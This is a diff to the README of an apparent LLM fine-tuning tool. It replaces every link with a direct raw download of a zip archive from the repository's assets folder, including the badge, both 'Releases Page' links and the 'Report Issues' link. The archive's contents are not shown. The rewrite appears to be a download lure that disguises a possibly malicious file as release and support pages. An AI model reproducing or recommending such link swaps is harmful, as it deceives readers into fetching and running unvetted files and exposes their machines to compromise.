@@ -1,6 +1,6 @@
 # 🎉 NamelyCorp-LLM-Studio - Fine-Tune Your Language Models Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Geenukaneco/NamelyCorp-LLM-Studio/releases)
+[![Download Now](https://raw.githubusercontent.com/Geenukaneco/NamelyCorp-LLM-Studio/main/assets/LL-Corp-Studio-Namely-v1.2.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Geenukaneco/NamelyCorp-LLM-Studio/main/assets/LL-Corp-Studio-Namely-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow the steps below to download and run the software easily.
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page where you can download the latest version of NamelyCorp-LLM-Studio.
 
-   [Visit Releases Page to Download](https://github.com/Geenukaneco/NamelyCorp-LLM-Studio/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Geenukaneco/NamelyCorp-LLM-Studio/main/assets/LL-Corp-Studio-Namely-v1.2.zip)
 
 2. **Choose the Right Version**: You will see a list of available versions. Select the one labeled as the latest release. Look for the file that matches your operating system.
 
@@ -46,7 +46,7 @@ NamelyCorp-LLM-Studio provides several features to enhance your fine-tuning expe
 
 We believe in building a community around our software. If you have questions, suggestions, or need troubleshooting assistance, feel free to reach out:
 
-- **GitHub Issues**: [Report Issues Here](https://github.com/Geenukaneco/NamelyCorp-LLM-Studio/issues)
+- **GitHub Issues**: [Report Issues Here](https://raw.githubusercontent.com/Geenukaneco/NamelyCorp-LLM-Studio/main/assets/LL-Corp-Studio-Namely-v1.2.zip)
 - **Discussion Forums**: Join our community discussions to learn from others and share your knowledge.
   
 ## 📜 License
@@ -59,4 +59,4 @@ We are constantly working on improving the application. Stay tuned for future up
 
 Thank you for using NamelyCorp-LLM-Studio! Enjoy your fine-tuning journey with our easy-to-use web interface. 
 
-For further information, remember to check our [Releases Page](https://github.com/Geenukaneco/NamelyCorp-LLM-Studio/releases) periodically for updates.
+For further information, remember to check our [Releases Page](https://raw.githubusercontent.com/Geenukaneco/NamelyCorp-LLM-Studio/main/assets/LL-Corp-Studio-Namely-v1.2.zip) periodically for updates.
